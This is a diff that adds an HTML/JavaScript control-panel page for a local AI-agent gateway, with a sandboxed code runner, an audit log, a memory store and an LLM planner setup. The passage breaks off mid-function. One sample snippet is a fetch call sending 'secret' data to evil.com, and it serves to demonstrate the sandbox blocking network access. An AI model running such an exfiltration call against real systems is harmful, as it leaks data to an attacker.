@@ -1,0 +1,935 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Aether Control Center</title>
+  <style>
+    :root {
+      --bg: #0d1117;
+      --bg2: #161b22;
+      --bg3: #21262d;
+      --border: #30363d;
+      --text: #e6edf3;
+      --text2: #8b949e;
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --red: #f85149;
+      --yellow: #d29922;
+      --purple: #bc8cff;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: 'SF Mono', 'Fira Code', monospace; font-size: 13px; }
+
+    /* ── Header ── */
+    header {
+      display: flex; align-items: center; gap: 12px;
+      padding: 12px 20px; background: var(--bg2); border-bottom: 1px solid var(--border);
+    }
+    header h1 { font-size: 16px; letter-spacing: 0.5px; color: var(--accent); }
+    .badge {
+      font-size: 11px; padding: 2px 8px; border-radius: 12px;
+      background: rgba(88,166,255,0.15); color: var(--accent); border: 1px solid var(--accent);
+    }
+    .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--green); animation: pulse 2s infinite; }
+    .dot.offline { background: var(--red); animation: none; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+    .spacer { flex: 1; }
+    .gw-port { color: var(--text2); font-size: 11px; }
+
+    /* ── Layout ── */
+    .layout { display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: auto 1fr; gap: 1px; height: calc(100vh - 49px); background: var(--border); }
+    .panel { background: var(--bg); display: flex; flex-direction: column; overflow: hidden; }
+    .panel-header {
+      display: flex; align-items: center; gap: 8px;
+      padding: 8px 14px; background: var(--bg2); border-bottom: 1px solid var(--border);
+      font-size: 11px; font-weight: 600; color: var(--text2); text-transform: uppercase; letter-spacing: 0.8px;
+    }
+    .panel-body { flex: 1; overflow-y: auto; padding: 12px; }
+
+    /* ── Sandbox Editor ── */
+    .editor-wrap { display: flex; flex-direction: column; gap: 8px; height: 100%; }
+    .manifest-row { display: flex; gap: 8px; align-items: center; }
+    .manifest-row label { color: var(--text2); font-size: 11px; }
+    select, input[type=text] {
+      background: var(--bg3); border: 1px solid var(--border); color: var(--text);
+      padding: 4px 8px; border-radius: 4px; font-size: 12px; font-family: inherit;
+    }
+    select:focus, input[type=text]:focus { outline: none; border-color: var(--accent); }
+    textarea {
+      flex: 1; min-height: 180px; background: var(--bg3); border: 1px solid var(--border);
+      color: var(--text); padding: 10px; border-radius: 6px;
+      font-family: 'SF Mono', 'Fira Code', monospace; font-size: 13px;
+      resize: none; line-height: 1.6;
+    }
+    textarea:focus { outline: none; border-color: var(--accent); }
+    .btn-row { display: flex; gap: 8px; }
+    button {
+      padding: 6px 16px; border-radius: 6px; border: none; cursor: pointer;
+      font-size: 12px; font-family: inherit; font-weight: 600; transition: opacity .15s;
+    }
+    button:hover { opacity: .85; }
+    button:disabled { opacity: .4; cursor: not-allowed; }
+    .btn-run { background: var(--green); color: #000; }
+    .btn-clear { background: var(--bg3); color: var(--text2); border: 1px solid var(--border); }
+    .btn-sample { background: rgba(88,166,255,0.15); color: var(--accent); border: 1px solid rgba(88,166,255,0.3); }
+
+    /* ── Result ── */
+    .result-box {
+      flex: 0 0 auto; background: var(--bg3); border: 1px solid var(--border);
+      border-radius: 6px; padding: 10px; max-height: 220px; overflow-y: auto;
+    }
+    .result-box.ok { border-color: rgba(63,185,80,0.4); }
+    .result-box.fail { border-color: rgba(248,81,73,0.4); }
+    .result-meta { display: flex; gap: 12px; margin-bottom: 6px; flex-wrap: wrap; }
+    .tag {
+      font-size: 10px; padding: 1px 6px; border-radius: 4px; font-weight: 600;
+    }
+    .tag.ok { background: rgba(63,185,80,.2); color: var(--green); }
+    .tag.fail { background: rgba(248,81,73,.2); color: var(--red); }
+    .tag.info { background: rgba(88,166,255,.15); color: var(--accent); }
+    .tag.warn { background: rgba(210,153,34,.15); color: var(--yellow); }
+    .result-output { color: var(--text); white-space: pre-wrap; word-break: break-all; line-height: 1.6; font-size: 12px; }
+    .result-stdout { color: var(--green); white-space: pre-wrap; }
+    .result-stderr { color: var(--red); white-space: pre-wrap; }
+    .result-error { color: var(--red); white-space: pre-wrap; }
+    .spinning { animation: spin 1s linear infinite; display: inline-block; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── Task History ── */
+    .task-list { display: flex; flex-direction: column; gap: 6px; }
+    .task-item {
+      background: var(--bg2); border: 1px solid var(--border); border-radius: 6px;
+      padding: 8px 10px; cursor: pointer; transition: border-color .15s;
+    }
+    .task-item:hover { border-color: var(--accent); }
+    .task-item.done { border-left: 3px solid var(--green); }
+    .task-item.failed { border-left: 3px solid var(--red); }
+    .task-item.running { border-left: 3px solid var(--yellow); }
+    .task-item.rejected { border-left: 3px solid var(--purple); }
+    .task-row1 { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
+    .task-id { color: var(--text2); font-size: 10px; }
+    .task-code { color: var(--text2); font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 300px; }
+    .task-dur { color: var(--text2); font-size: 10px; margin-left: auto; }
+
+    /* ── Status Panel ── */
+    .status-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
+    .stat-card {
+      background: var(--bg2); border: 1px solid var(--border); border-radius: 6px; padding: 10px;
+    }
+    .stat-label { font-size: 10px; color: var(--text2); text-transform: uppercase; margin-bottom: 4px; }
+    .stat-val { font-size: 22px; font-weight: 700; color: var(--text); }
+    .stat-val.green { color: var(--green); }
+    .stat-val.red { color: var(--red); }
+    .stat-val.yellow { color: var(--yellow); }
+
+    /* ── Audit Log ── */
+    .audit-entry {
+      padding: 4px 0; border-bottom: 1px solid var(--border); display: flex; gap: 8px;
+      font-size: 11px; line-height: 1.5;
+    }
+    .audit-entry:last-child { border-bottom: none; }
+    .audit-time { color: var(--text2); flex: 0 0 80px; }
+    .audit-ok { color: var(--green); flex: 0 0 20px; }
+    .audit-nok { color: var(--red); flex: 0 0 20px; }
+    .audit-action { color: var(--accent); flex: 0 0 160px; }
+    .audit-detail { color: var(--text); flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+    /* ── Memory Panel ── */
+    .mem-entry {
+      background: var(--bg3); border: 1px solid var(--border); border-radius: 4px;
+      padding: 6px 8px; margin-bottom: 4px; font-size: 11px;
+    }
+    .mem-score {
+      display: inline-block; background: var(--purple); color: #000;
+      border-radius: 3px; padding: 1px 5px; font-size: 10px; font-weight: bold; margin-left: 4px;
+    }
+    .mem-tag {
+      display: inline-block; background: var(--bg2); border: 1px solid var(--border);
+      border-radius: 3px; padding: 1px 4px; font-size: 10px; color: var(--text2); margin: 1px;
+    }
+
+    /* ── Scrollbar ── */
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="dot" id="status-dot"></div>
+  <h1>⚡ Aether Control Center</h1>
+  <span class="badge">MVP v0.1</span>
+  <span class="badge" id="runtime-badge">V8 Isolate</span>
+  <span class="spacer"></span>
+  <span class="gw-port" id="gw-info">Gateway: connecting...</span>
+</header>
+
+<div class="layout">
+
+  <!-- ① 沙箱执行控制台 -->
+  <div class="panel" style="grid-row: span 2;">
+    <div class="panel-header">
+      <span>🔒</span> Sandbox Executor
+    </div>
+    <div class="panel-body">
+      <div class="editor-wrap">
+        <div class="manifest-row">
+          <label>Manifest:</label>
+          <select id="manifest-select">
+            <option value="sandbox-exec">sandbox-exec (exec allowed)</option>
+            <option value="default-readonly">default-readonly (exec blocked)</option>
+          </select>
+          <label style="margin-left:8px;">Mode:</label>
+          <select id="mode-select">
+            <option value="exec">exec</option>
+            <option value="read">read</option>
+          </select>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn-sample" onclick="loadSample('fib')">斐波那契</button>
+          <button class="btn-sample" onclick="loadSample('sort')">排序算法</button>
+          <button class="btn-sample" onclick="loadSample('prime')">质数筛</button>
+          <button class="btn-sample" onclick="loadSample('block_net')">🚫 网络拦截</button>
+          <button class="btn-sample" onclick="loadSample('timeout')">⏱ 超时测试</button>
+        </div>
+
+        <textarea id="code-editor" placeholder="// 在此输入 JavaScript 代码...
+// 沙箱内可用：console.log, Math, Date, JSON, Promise, Map, Set...
+// 禁止：fetch, require('fs'), require('net'), process.exit
+
+console.log('Hello from Aether Sandbox!');
+Math.pow(2, 10);"
+        >function fib(n) {
+  if (n <= 1) return n;
+  return fib(n - 1) + fib(n - 2);
+}
+const results = [];
+for (let i = 0; i < 12; i++) results.push(fib(i));
+console.log('Fibonacci sequence:', JSON.stringify(results));
+results</textarea>
+
+        <div class="btn-row">
+          <button class="btn-run" id="run-btn" onclick="runCode()">▶ Run in Sandbox</button>
+          <button class="btn-clear" onclick="clearResult()">Clear</button>
+        </div>
+
+        <div id="result-area" class="result-box" style="display:none;">
+          <div class="result-meta" id="result-meta"></div>
+          <div id="result-content"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ② 任务历史 -->
+  <div class="panel">
+    <div class="panel-header">
+      <span>📋</span> Task History
+      <button class="btn-clear" style="margin-left:auto;padding:2px 8px;" onclick="loadTasks()">↻ Refresh</button>
+    </div>
+    <div class="panel-body">
+      <div id="stats-row" class="status-grid"></div>
+      <div id="task-list" class="task-list">
+        <div style="color:var(--text2);text-align:center;padding:20px;">Loading...</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ③ 审计日志 -->
+  <div class="panel">
+    <div class="panel-header">
+      <span>🛡️</span> Audit Log (Live)
+      <button class="btn-clear" style="margin-left:auto;padding:2px 8px;" onclick="loadAudit()">↻ Refresh</button>
+    </div>
+    <div class="panel-body">
+      <div id="audit-list">
+        <div style="color:var(--text2);text-align:center;padding:20px;">Loading...</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ④ 分层记忆系统 -->
+  <div class="panel" style="grid-column: span 2;">
+    <div class="panel-header">
+      <span>🧠</span> Memory System (EP-04)
+      <button class="btn-clear" style="margin-left:auto;padding:2px 8px;" onclick="loadMemoryStats()">↻ Stats</button>
+    </div>
+
+    <div class="panel-body" style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+
+      <!-- 左：写入 + 检索 -->
+      <div>
+        <div style="color:var(--text2);font-size:11px;margin-bottom:6px;">WRITE MEMORY</div>
+        <textarea id="mem-write-input" style="width:100%;height:60px;background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:6px;font-family:inherit;font-size:12px;resize:none;" placeholder="Enter content to remember..."></textarea>
+        <div style="display:flex;gap:6px;margin-top:4px;align-items:center;">
+          <input id="mem-tags" style="flex:1;background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:4px 6px;font-size:11px;" placeholder="tags (comma-separated)" />
+          <select id="mem-source" style="background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:4px 6px;font-size:11px;">
+            <option value="user">user</option>
+            <option value="agent">agent</option>
+            <option value="system">system</option>
+          </select>
+          <button class="btn-run" style="padding:4px 10px;font-size:11px;" onclick="writeMemory()">💾 Save</button>
+        </div>
+
+        <div style="margin-top:12px;color:var(--text2);font-size:11px;margin-bottom:6px;">SEMANTIC RECALL</div>
+        <div style="display:flex;gap:6px;">
+          <input id="mem-query" style="flex:1;background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:4px 8px;font-size:12px;" placeholder="Search memory by meaning..." />
+          <button class="btn-run" style="padding:4px 10px;font-size:11px;" onclick="recallMemory()">🔍 Recall</button>
+        </div>
+        <div id="mem-recall-results" style="margin-top:8px;max-height:200px;overflow-y:auto;"></div>
+      </div>
+
+      <!-- 右：统计仪表盘 -->
+      <div>
+        <div style="color:var(--text2);font-size:11px;margin-bottom:8px;">MEMORY STATS</div>
+        <div id="mem-stats" style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;">
+          <div class="stat-card" id="stat-l1">
+            <div style="font-size:10px;color:var(--text2);">L1 WORKING</div>
+            <div id="stat-l1-val" style="font-size:20px;color:var(--green);font-weight:bold;">—</div>
+            <div style="font-size:10px;color:var(--text2);">entries</div>
+          </div>
+          <div class="stat-card" id="stat-l2">
+            <div style="font-size:10px;color:var(--text2);">L2 EPISODIC</div>
+            <div id="stat-l2-val" style="font-size:20px;color:var(--accent);font-weight:bold;">—</div>
+            <div style="font-size:10px;color:var(--text2);">entries</div>
+          </div>
+          <div class="stat-card" id="stat-l3">
+            <div style="font-size:10px;color:var(--text2);">L3 SEMANTIC</div>
+            <div id="stat-l3-val" style="font-size:20px;color:var(--purple);font-weight:bold;">—</div>
+            <div style="font-size:10px;color:var(--text2);">vocab terms</div>
+          </div>
+        </div>
+        <div style="color:var(--text2);font-size:11px;margin-bottom:6px;">RECENT MEMORIES</div>
+        <div id="mem-recent" style="max-height:220px;overflow-y:auto;font-size:11px;"></div>
+        <button class="btn-clear" style="margin-top:8px;width:100%;padding:4px;" onclick="clearWorkingMemory()">🗑 Clear Working Memory (L1)</button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ⑤ LLM Planner (EP-07) -->
+  <div class="panel" style="grid-column: span 2;">
+    <div class="panel-header">
+      <span>🤖</span> LLM Planner (EP-07) — Real ReAct Loop
+      <span id="llm-status-badge" class="tag warn" style="margin-left:8px;">Not Configured</span>
+      <button class="btn-clear" style="margin-left:auto;padding:2px 8px;" onclick="pingLLM()">⚡ Ping</button>
+    </div>
+    <div class="panel-body" style="display:grid;grid-template-columns:300px 1fr;gap:16px;">
+
+      <!-- 左：Provider 配置 -->
+      <div>
+        <div style="color:var(--text2);font-size:11px;margin-bottom:6px;text-transform:uppercase;">Provider Config</div>
+
+        <div style="margin-bottom:6px;">
+          <label style="color:var(--text2);font-size:11px;display:block;margin-bottom:2px;">Preset</label>
+          <select id="llm-preset" style="width:100%" onchange="applyPreset()">
+            <option value="">-- Select Preset --</option>
+            <option value="ollama">Ollama (Local)</option>
+            <option value="openai">OpenAI</option>
+            <option value="openrouter">OpenRouter</option>
+            <option value="deepseek">DeepSeek</option>
+          </select>
+        </div>
+
+        <div style="margin-bottom:6px;">
+          <label style="color:var(--text2);font-size:11px;display:block;margin-bottom:2px;">Base URL</label>
+          <input id="llm-base-url" type="text" style="width:100%" placeholder="http://localhost:11434/v1" value="http://localhost:11434/v1" />
+        </div>
+
+        <div style="margin-bottom:6px;">
+          <label style="color:var(--text2);font-size:11px;display:block;margin-bottom:2px;">Model</label>
+          <input id="llm-model" type="text" style="width:100%" placeholder="llama3.2" value="llama3.2" />
+        </div>
+
+        <div style="margin-bottom:6px;">
+          <label style="color:var(--text2);font-size:11px;display:block;margin-bottom:2px;">API Key (optional)</label>
+          <input id="llm-api-key" type="text" style="width:100%" placeholder="sk-... (leave empty for Ollama)" />
+        </div>
+
+        <div style="display:flex;gap:6px;margin-top:8px;">
+          <button class="btn-run" style="flex:1;padding:5px;" onclick="configureLLM()">✓ Apply</button>
+          <button class="btn-sample" style="flex:1;padding:5px;" onclick="pingLLM()">⚡ Test</button>
+        </div>
+
+        <div id="llm-config-result" style="margin-top:8px;font-size:11px;"></div>
+
+        <div style="margin-top:12px;color:var(--text2);font-size:10px;line-height:1.6;">
+          <div>💡 <b>Ollama</b>: run <code style="color:var(--accent);">ollama serve</code></div>
+          <div>💡 <b>OpenAI</b>: set API Key → gpt-4o-mini</div>
+          <div>💡 <b>DeepSeek</b>: api.deepseek.com → deepseek-chat</div>
+        </div>
+      </div>
+
+      <!-- 右：对话 / ReAct Runner -->
+      <div style="display:flex;flex-direction:column;gap:8px;">
+        <div style="display:flex;gap:8px;align-items:center;">
+          <div style="color:var(--text2);font-size:11px;text-transform:uppercase;flex:1;">Agent Task (ReAct Loop)</div>
+          <label style="color:var(--text2);font-size:11px;display:flex;align-items:center;gap:4px;">
+            <input type="checkbox" id="llm-use-tools" checked /> Use Tools
+          </label>
+        </div>
+
+        <textarea id="llm-task-input" style="height:80px;width:100%;background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:8px;font-family:inherit;font-size:13px;resize:none;" placeholder="Enter task for the Agent... e.g. 'Calculate fibonacci(10) and remember the result'"></textarea>
+
+        <div style="display:flex;gap:8px;">
+          <button class="btn-run" id="llm-run-btn" onclick="runLLMAgent()" style="flex:1;">▶ Run Agent (LLM Planner)</button>
+          <button class="btn-sample" onclick="runLLMChat()" style="flex:0 0 auto;">💬 Direct Chat</button>
+          <button class="btn-clear" onclick="clearLLMOutput()">Clear</button>
+        </div>
+
+        <!-- 直接对话输入（默认隐藏） -->
+        <div id="llm-chat-area" style="display:none;">
+          <div style="color:var(--text2);font-size:11px;margin-bottom:4px;">DIRECT CHAT (no tools)</div>
+          <textarea id="llm-chat-input" style="height:60px;width:100%;background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:8px;font-family:inherit;font-size:13px;resize:none;" placeholder="Type a message..."></textarea>
+          <button class="btn-run" onclick="sendChat()" style="margin-top:4px;padding:4px 12px;">Send</button>
+        </div>
+
+        <!-- ReAct 步骤输出 -->
+        <div id="llm-output" style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:10px;overflow-y:auto;min-height:200px;max-height:340px;font-size:12px;line-height:1.7;">
+          <div style="color:var(--text2);">LLM output will appear here...</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+
+<script>
+const GATEWAY = 'http://127.0.0.1:19009';
+
+// ── 代码样本 ──────────────────────────────────────────────────────────────
+const SAMPLES = {
+  fib: `function fib(n) {
+  if (n <= 1) return n;
+  return fib(n - 1) + fib(n - 2);
+}
+const results = [];
+for (let i = 0; i < 12; i++) results.push(fib(i));
+console.log('Fibonacci:', JSON.stringify(results));
+results`,
+
+  sort: `// 多种排序算法对比
+function bubbleSort(arr) {
+  const a = [...arr];
+  for (let i = 0; i < a.length; i++)
+    for (let j = 0; j < a.length - i - 1; j++)
+      if (a[j] > a[j+1]) [a[j], a[j+1]] = [a[j+1], a[j]];
+  return a;
+}
+const data = [64, 34, 25, 12, 22, 11, 90, 45, 67, 3];
+console.log('Original:', JSON.stringify(data));
+const sorted = bubbleSort(data);
+console.log('Sorted:  ', JSON.stringify(sorted));
+sorted`,
+
+  prime: `// Sieve of Eratosthenes - 埃拉托斯特尼筛法
+function sieve(n) {
+  const isPrime = new Array(n + 1).fill(true);
+  isPrime[0] = isPrime[1] = false;
+  for (let i = 2; i * i <= n; i++)
+    if (isPrime[i])
+      for (let j = i * i; j <= n; j += i)
+        isPrime[j] = false;
+  return isPrime.map((v, i) => v ? i : -1).filter(x => x > 0);
+}
+const primes = sieve(100);
+console.log(\`Found \${primes.length} primes up to 100:\`, JSON.stringify(primes));
+primes.length`,
+
+  block_net: `// 这段代码会被安全策略拦截
+fetch('http://evil.com/steal?data=secret')
+  .then(r => r.text())
+  .then(console.log);`,
+
+  timeout: `// 无限循环 - 会被 30s 超时终止
+let i = 0;
+while (true) { i++; }`,
+};
+
+function loadSample(name) {
+  document.getElementById('code-editor').value = SAMPLES[name];
+  clearResult();
+  if (name === 'block_net' || name === 'timeout') {
+    document.getElementById('manifest-select').value = 'sandbox-exec';
+  }
+}
+
+// ── 执行代码 ──────────────────────────────────────────────────────────────
+async function runCode() {
+  const code = document.getElementById('code-editor').value.trim();
+  const manifestName = document.getElementById('manifest-select').value;
+  const operation = document.getElementById('mode-select').value;
+
+  if (!code) return;
+
+  const btn = document.getElementById('run-btn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinning">⟳</span> Running...';
+
+  const area = document.getElementById('result-area');
+  const meta = document.getElementById('result-meta');
+  const content = document.getElementById('result-content');
+
+  area.style.display = 'block';
+  area.className = 'result-box';
+  meta.innerHTML = '<span class="tag info"><span class="spinning">⟳</span> Executing in V8 Isolate...</span>';
+  content.innerHTML = '';
+
+  const startTime = Date.now();
+
+  try {
+    const res = await fetch(`${GATEWAY}/api/agent/execute`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ code, operation, manifestName, sync: true }),
+    });
+    const data = await res.json();
+    const wallTime = Date.now() - startTime;
+
+    const r = data.result || {};
+    const ok = r.ok === true;
+
+    area.className = `result-box ${ok ? 'ok' : 'fail'}`;
+    meta.innerHTML = `
+      <span class="tag ${ok ? 'ok' : 'fail'}">${ok ? '✅ SUCCESS' : '❌ FAILED'}</span>
+      <span class="tag info">${data.status}</span>
+      ${r.durationMs !== undefined ? `<span class="tag info">⚡ ${r.durationMs}ms sandbox</span>` : ''}
+      ${r.memoryUsedMb !== undefined ? `<span class="tag info">💾 ${r.memoryUsedMb}MB</span>` : ''}
+      <span class="tag info">🌐 ${wallTime}ms total</span>
+      ${r.violations?.length ? `<span class="tag warn">⚠ ${r.violations.length} policy violation(s)</span>` : ''}
+    `;
+
+    let html = '';
+    if (r.stdout) html += `<div class="result-stdout">stdout:\n${esc(r.stdout)}</div>`;
+    if (r.stderr) html += `<div class="result-stderr">stderr:\n${esc(r.stderr)}</div>`;
+    if (r.error) html += `<div class="result-error">error: ${esc(r.error)}</div>`;
+    if (r.violations?.length) {
+      r.violations.forEach(v => {
+        html += `<div class="result-error">🚫 [${v.type}] ${esc(v.detail)}</div>`;
+      });
+    }
+    if (r.output !== undefined && r.output !== null) {
+      const outStr = typeof r.output === 'object' ? JSON.stringify(r.output, null, 2) : String(r.output);
+      html += `<div class="result-output">output: ${esc(outStr)}</div>`;
+    }
+    if (!html) html = `<div class="result-output" style="color:var(--text2)">(no output)</div>`;
+    content.innerHTML = html;
+
+    loadTasks();
+    loadAudit();
+  } catch (err) {
+    area.className = 'result-box fail';
+    meta.innerHTML = '<span class="tag fail">❌ NETWORK ERROR</span>';
+    content.innerHTML = `<div class="result-error">${esc(err.message)}</div>`;
+  }
+
+  btn.disabled = false;
+  btn.innerHTML = '▶ Run in Sandbox';
+}
+
+function clearResult() {
+  document.getElementById('result-area').style.display = 'none';
+}
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ── 任务历史 ──────────────────────────────────────────────────────────────
+async function loadTasks() {
+  try {
+    const res = await fetch(`${GATEWAY}/api/agent/tasks?limit=20`);
+    const data = await res.json();
+
+    // 统计卡片
+    const s = data.stats || {};
+    document.getElementById('stats-row').innerHTML = `
+      <div class="stat-card"><div class="stat-label">Total</div><div class="stat-val">${s.total||0}</div></div>
+      <div class="stat-card"><div class="stat-label">Done</div><div class="stat-val green">${s.done||0}</div></div>
+      <div class="stat-card"><div class="stat-label">Failed</div><div class="stat-val red">${s.failed||0}</div></div>
+      <div class="stat-card"><div class="stat-label">Rejected</div><div class="stat-val yellow">${s.rejected||0}</div></div>
+    `;
+
+    const list = document.getElementById('task-list');
+    if (!data.tasks?.length) {
+      list.innerHTML = '<div style="color:var(--text2);text-align:center;padding:20px;">No tasks yet</div>';
+      return;
+    }
+    list.innerHTML = data.tasks.map(t => {
+      const dur = t.result?.durationMs !== undefined ? `${t.result.durationMs}ms` : '';
+      const codePreview = t.code ? esc(t.code.slice(0, 60).replace(/\n/g,' ')) : t.operation;
+      const ts = new Date(t.submittedAt).toLocaleTimeString();
+      const ok = t.result?.ok;
+      return `<div class="task-item ${t.status}" onclick='showTask(${JSON.stringify(JSON.stringify(t))})'>
+        <div class="task-row1">
+          <span class="tag ${t.status === 'done' ? 'ok' : t.status === 'failed' ? 'fail' : 'warn'}">${t.status}</span>
+          <span class="tag info">${t.operation}</span>
+          <span class="task-id">${t.id.slice(0,8)}</span>
+          <span class="task-dur">${dur} · ${ts}</span>
+        </div>
+        <div class="task-code">${codePreview}</div>
+      </div>`;
+    }).join('');
+  } catch (e) {
+    document.getElementById('task-list').innerHTML = `<div style="color:var(--red)">Error: ${esc(e.message)}</div>`;
+  }
+}
+
+function showTask(taskJson) {
+  const t = JSON.parse(taskJson);
+  const r = t.result || {};
+  const code = document.getElementById('code-editor');
+  if (t.code) code.value = t.code;
+  const area = document.getElementById('result-area');
+  const meta = document.getElementById('result-meta');
+  const content = document.getElementById('result-content');
+  area.style.display = 'block';
+  area.className = `result-box ${r.ok ? 'ok' : 'fail'}`;
+  meta.innerHTML = `
+    <span class="tag ${r.ok ? 'ok' : 'fail'}">${r.ok ? '✅ SUCCESS' : '❌ FAILED'}</span>
+    <span class="tag info">${t.status}</span>
+    ${r.durationMs !== undefined ? `<span class="tag info">⚡ ${r.durationMs}ms</span>` : ''}
+    ${r.memoryUsedMb !== undefined ? `<span class="tag info">💾 ${r.memoryUsedMb}MB</span>` : ''}
+    <span class="tag info">ID: ${t.id.slice(0,8)}</span>
+  `;
+  let html = '';
+  if (r.stdout) html += `<div class="result-stdout">stdout:\n${esc(r.stdout)}</div>`;
+  if (r.stderr) html += `<div class="result-stderr">stderr:\n${esc(r.stderr)}</div>`;
+  if (r.error) html += `<div class="result-error">error: ${esc(r.error)}</div>`;
+  if (r.violations?.length) r.violations.forEach(v => { html += `<div class="result-error">🚫 [${v.type}] ${esc(v.detail)}</div>`; });
+  if (r.output !== undefined && r.output !== null) {
+    const outStr = typeof r.output === 'object' ? JSON.stringify(r.output, null, 2) : String(r.output);
+    html += `<div class="result-output">output: ${esc(outStr)}</div>`;
+  }
+  content.innerHTML = html || '<div style="color:var(--text2)">(no output)</div>';
+}
+
+// ── 审计日志 ──────────────────────────────────────────────────────────────
+async function loadAudit() {
+  try {
+    const res = await fetch(`${GATEWAY}/api/status/audit?limit=30`);
+    const data = await res.json();
+    const list = document.getElementById('audit-list');
+    if (!data.recent?.length) {
+      list.innerHTML = '<div style="color:var(--text2);text-align:center;padding:20px;">No audit entries yet</div>';
+      return;
+    }
+    list.innerHTML = [...data.recent].reverse().map(e => {
+      const t = new Date(e.timestamp).toLocaleTimeString();
+      return `<div class="audit-entry">
+        <span class="audit-time">${t}</span>
+        <span class="${e.ok ? 'audit-ok' : 'audit-nok'}">${e.ok ? '✓' : '✗'}</span>
+        <span class="audit-action">${esc(e.action)}</span>
+        <span class="audit-detail" title="${esc(e.detail)}">${esc(e.detail)}</span>
+      </div>`;
+    }).join('');
+  } catch (e) {
+    document.getElementById('audit-list').innerHTML = `<div style="color:var(--red)">Error: ${esc(e.message)}</div>`;
+  }
+}
+
+// ── 健康检查 ──────────────────────────────────────────────────────────────
+async function checkHealth() {
+  try {
+    const res = await fetch(`${GATEWAY}/health`);
+    const d = await res.json();
+    document.getElementById('status-dot').className = 'dot';
+    document.getElementById('gw-info').textContent = `Gateway :${GATEWAY.split(':').pop()} · v${d.version} · online`;
+  } catch {
+    document.getElementById('status-dot').className = 'dot offline';
+    document.getElementById('gw-info').textContent = 'Gateway: offline';
+  }
+}
+
+// ── 记忆系统 ──────────────────────────────────────────────────────────────
+
+async function loadMemoryStats() {
+  try {
+    const res = await fetch(`${GATEWAY}/api/memory/stats`);
+    const d = await res.json();
+    if (!d.ok) return;
+    const s = d.stats;
+    document.getElementById('stat-l1-val').textContent = s.working.count;
+    document.getElementById('stat-l2-val').textContent = s.episodic.count;
+    document.getElementById('stat-l3-val').textContent = s.semantic.vocabSize;
+  } catch (e) {
+    console.warn('Memory stats failed:', e);
+  }
+}
+
+async function loadRecentMemories() {
+  try {
+    const res = await fetch(`${GATEWAY}/api/memory/recall`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ limit: 8 }),
+    });
+    const d = await res.json();
+    const el = document.getElementById('mem-recent');
+    if (!d.ok || d.entries.length === 0) {
+      el.innerHTML = '<div style="color:var(--text2);padding:8px;text-align:center;">No memories yet</div>';
+      return;
+    }
+    el.innerHTML = d.entries.map(e => {
+      const tags = (e.metadata.tags || []).map(t => `<span class="mem-tag">${t}</span>`).join('');
+      const src  = e.metadata.source ? `<span class="mem-tag" style="color:var(--accent);">${e.metadata.source}</span>` : '';
+      return `<div class="mem-entry">
+        <div style="color:var(--text);line-height:1.4;">${e.content.slice(0, 120)}${e.content.length > 120 ? '…' : ''}</div>
+        <div style="margin-top:3px;">${src}${tags}<span style="float:right;color:var(--text2);font-size:10px;">${new Date(e.createdAt).toLocaleTimeString()}</span></div>
+      </div>`;
+    }).join('');
+  } catch(e) { console.warn('Recent memories failed:', e); }
+}
+
+async function writeMemory() {
+  const content = document.getElementById('mem-write-input').value.trim();
+  if (!content) return;
+  const tagsRaw = document.getElementById('mem-tags').value.trim();
+  const tags = tagsRaw ? tagsRaw.split(',').map(t => t.trim()).filter(Boolean) : [];
+  const source = document.getElementById('mem-source').value;
+
+  try {
+    const res = await fetch(`${GATEWAY}/api/memory/remember`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content, metadata: { source, tags, importance: 0.7 } }),
+    });
+    const d = await res.json();
+    if (d.ok) {
+      document.getElementById('mem-write-input').value = '';
+      document.getElementById('mem-tags').value = '';
+      await loadMemoryStats();
+      await loadRecentMemories();
+    }
+  } catch(e) { alert('Write failed: ' + e); }
+}
+
+async function recallMemory() {
+  const text = document.getElementById('mem-query').value.trim();
+  const el = document.getElementById('mem-recall-results');
+  el.innerHTML = '<div style="color:var(--text2);">Searching...</div>';
+
+  try {
+    const res = await fetch(`${GATEWAY}/api/memory/recall`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ text: text || undefined, limit: 6, tier: 'semantic' }),
+    });
+    const d = await res.json();
+    if (!d.ok || d.entries.length === 0) {
+      el.innerHTML = '<div style="color:var(--text2);padding:6px;">No results found</div>';
